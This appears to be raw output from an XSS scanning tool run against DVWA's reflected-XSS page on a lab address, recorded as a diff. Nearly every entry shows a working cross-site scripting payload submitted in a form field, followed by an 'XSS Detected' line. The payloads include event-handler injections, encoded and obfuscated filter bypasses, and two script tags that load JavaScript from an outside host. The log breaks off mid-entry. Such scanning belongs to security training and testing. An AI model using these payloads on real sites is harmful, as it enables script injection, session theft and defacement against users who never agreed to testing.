+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onhelp=alert(1)>press F1! (MSIE)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<marquee onstart=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<marquee loop=1 width=0 onfinish=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<audio src onloadstart=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<video onloadstart=alert(1)><source>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<input autofocus onblur=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<keygen autofocus onfocus=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form onsubmit=alert(1)><input type=submit>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<select onchange=alert(1)><option>1<option>2\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<menu id=x contextmenu=x onshow=alert(1)>right click me!\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert`1`\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert&lpar;1&rpar;\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert&#x28;1&#x29\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert&#40;1&#41\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '(alert)(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'a=alert,a(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '[1].find(alert)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'top["al"+"ert"](1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'top[/al/.source+/ert/.source](1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'al\\u0065rt(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "top['al\\145rt'](1)\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "top['al\\x65rt'](1)\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'top[8680439..toString(30)](1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'navigator.vibrate(500)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'eval(URL.slice(-8))>#alert(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'eval(location.hash.slice(1)>#alert(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'innerHTML=location.hash>#<script>alert(1)</script>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a draggable="true" ondrag="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a draggable="true" ondragend="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a draggable="true" ondragenter="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a draggable="true" ondragleave="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a draggable="true" ondragstart="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a id=x tabindex=1 onactivate=alert(1)></a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a id=x tabindex=1 onbeforeactivate=alert(1)></a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a id=x tabindex=1 onfocus=alert(1)></a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a id=x tabindex=1 onfocusin=alert(1)></a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onbeforecopy="alert(1)" contenteditable>test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onbeforecut="alert(1)" contenteditable>test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onbeforepaste="alert(1)" contenteditable>test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onclick="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a oncontextmenu="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a oncopy="alert(1)" contenteditable>test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a oncut="alert(1)" contenteditable>test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a ondblclick="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onkeydown="alert(1)" contenteditable>test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onkeypress="alert(1)" contenteditable>test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onkeyup="alert(1)" contenteditable>test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onmousedown="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onmouseenter="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onmouseleave="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onmousemove="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onmouseout="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onmouseover="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onmouseup="alert(1)">test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<a onpaste="alert(1)" contenteditable>test</a>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<abbr draggable="true" ondrag="alert(1)">test</abbr>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<abbr draggable="true" ondragend="alert(1)">test</abbr>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<abbr draggable="true" ondragenter="alert(1)">test</abbr>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<abbr draggable="true" ondragleave="alert(1)">test</abbr>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image/src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img/src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img src/onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<image src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<img src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '</scrip</script>t><img src =q onerror=prompt(8)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<svg onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"><svg onload=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"onmouseover=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '"autofocus/onfocus=alert(1)//\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'-alert(1)-'\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "'-alert(1)//\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "\\'-alert(1)//\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '</script><svg onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onblur=alert(1)>lose focus! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onclick=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncopy=alert(1)>copy this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncontextmenu=alert(1)>right click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x oncut=alert(1)>copy this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x ondblclick=alert(1)>double click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x ondrag=alert(1)>drag this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onfocus=alert(1)>focus this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable oninput=alert(1)>input here! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeydown=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeypress=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onkeyup=alert(1)>press any key! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmousedown=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmousemove=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseout=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseover=alert(1)>hover this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onmouseup=alert(1)>click this! \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x contenteditable onpaste=alert(1)>paste here!\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)// \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script>alert(1)<!–\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=//brutelogic.com.br/1.js> \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script src=//3334957647/1>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '%3Cx onxxx=alert(1) \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<%78 onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x %6Fnxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x o%6Exxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x on%78xx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onxxx%3D1\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<X onxxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x OnXxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<X OnXxx=1 \n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<x onxxx=1 onxxx=1\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
